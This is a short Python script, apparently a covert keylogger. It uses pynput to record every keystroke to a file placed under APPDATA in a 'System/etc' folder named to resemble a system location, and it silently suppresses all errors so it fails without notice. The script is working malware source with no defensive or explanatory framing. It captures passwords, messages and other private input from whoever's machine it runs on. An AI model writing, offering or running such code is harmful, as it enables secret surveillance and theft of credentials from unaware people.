from pynput.keyboard import Key, Listener
import logging
import time
import os
import datetime

try:
    apdt = os.environ["APPDATA"]
    log_dir = apdt+"/System/etc/"
    today = str(datetime.date.today())

    logging.basicConfig(filename=(log_dir + "info.txt"), level=logging.DEBUG, format= today+': %(message)s')


    def on_press(key):
        logging.info(str(key))


    with Listener(on_press=on_press) as listener:
        listener.join()
except:
    pass

